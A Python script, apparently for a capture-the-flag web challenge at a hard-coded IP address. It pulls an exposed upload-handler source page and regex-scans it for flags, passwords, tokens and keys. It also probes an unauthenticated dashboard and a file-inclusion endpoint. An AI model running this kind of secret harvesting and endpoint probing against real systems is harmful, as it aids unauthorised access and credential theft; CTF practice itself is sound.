import requests
import re
import os
import html

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("获取完整Upload源码")
print("="*70)

r = session.get(f"{TARGET}/upload-source", timeout=15)
if r.status_code == 200:
    # 提取源码
    source_match = re.search(r'<pre class="source-code">(.*?)</pre>', r.text, re.DOTALL)
    if source_match:
        source = html.unescape(source_match.group(1))
        
        print(f"完整源码:\n{source}")
        
        # 保存源码
        with open("upload_source_full.txt", "w", encoding="utf-8") as f:
            f.write(source)
        print(f"\n源码已保存到 upload_source_full.txt")
        
        # 搜索flag
        flag_match = re.search(r'flag\{[^}]+\}', source, re.IGNORECASE)
        if flag_match:
            print(f"\n🚩🚩🚩 FLAG FOUND IN UPLOAD SOURCE: {flag_match.group(0)} 🚩🚩🚩")
            exit(0)
        
        # 搜索敏感变量
        secret_vars = re.findall(r'(SECRET|FLAG|PASSWORD|KEY|TOKEN|ADMIN)\s*=\s*["\']([^"\']+)["\']', source, re.IGNORECASE)
        if secret_vars:
            print(f"\n敏感变量: {secret_vars}")
        
        # 搜索函数名
        functions = re.findall(r'def\s+([a-z_]+)\s*\([^)]*\)', source)
        print(f"\n函数列表: {functions}")
        
        # 搜索类名
        classes = re.findall(r'class\s+([A-Za-z_]+)', source)
        print(f"\n类列表: {classes}")
        
        # 搜索白名单/黑名单配置
        whitelist = re.findall(r'ALLOWED_[A-Z]+\s*=\s*\{[^}]+\}', source)
        print(f"\n白名单配置: {whitelist}")
        
        blacklist = re.findall(r'BLOCKED_[A-Z]+\s*=\s*\{[^}]+\}', source)
        print(f"\n黑名单配置: {blacklist}")
        
        # 搜索可能的flag位置（如文件路径）
        file_paths = re.findall(r'[A-Z]:\\\\[^"\']+', source)
        print(f"\n文件路径: {file_paths}")
        
        # 搜索关键字符串
        keywords = re.findall(r'["\'][^"\']*flag[^"\']*["\']', source, re.IGNORECASE)
        print(f"\n包含flag的字符串: {keywords}")

print("\n" + "="*70)
print("检查控制台页面（可能需要登录）")
print("="*70)

# 直接访问控制台看看内容
r = session.get(f"{TARGET}/dashboard", timeout=15)
print(f"状态码: {r.status_code}")
print(f"内容:\n{r.text}")

# 搜索flag
flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
if flag_match:
    print(f"\n🚩🚩🚩 FLAG FOUND IN DASHBOARD: {flag_match.group(0)} 🚩🚩🚩")
    exit(0)

print("\n" + "="*70)
print("检查欢迎页面（文件包含）")
print("="*70)

r = session.get(f"{TARGET}/include", params={"page": "welcome"}, timeout=15)
body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
if body:
    welcome_content = html.unescape(body.group(1))
    print(f"Welcome内容:\n{welcome_content}")
    
    # 搜索flag
    flag_match = re.search(r'flag\{[^}]+\}', welcome_content, re.IGNORECASE)
    if flag_match:
        print(f"\n🚩🚩🚩 FLAG FOUND IN WELCOME: {flag_match.group(0)} 🚩🚩🚩")
        exit(0)

print("\n" + "="*70)
print("检查规则页面（文件包含）")
print("="*70)

r = session.get(f"{TARGET}/include", params={"page": "rules"}, timeout=15)
body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
if body:
    rules_content = html.unescape(body.group(1))
    print(f"Rules内容:\n{rules_content}")
    
    # 搜索flag
    flag_match = re.search(r'flag\{[^}]+\}', rules_content, re.IGNORECASE)
    if flag_match:
        print(f"\n🚩🚩🚩 FLAG FOUND IN RULES: {flag_match.group(0)} 🚩🚩🚩")
        exit(0)

print("\n测试完成")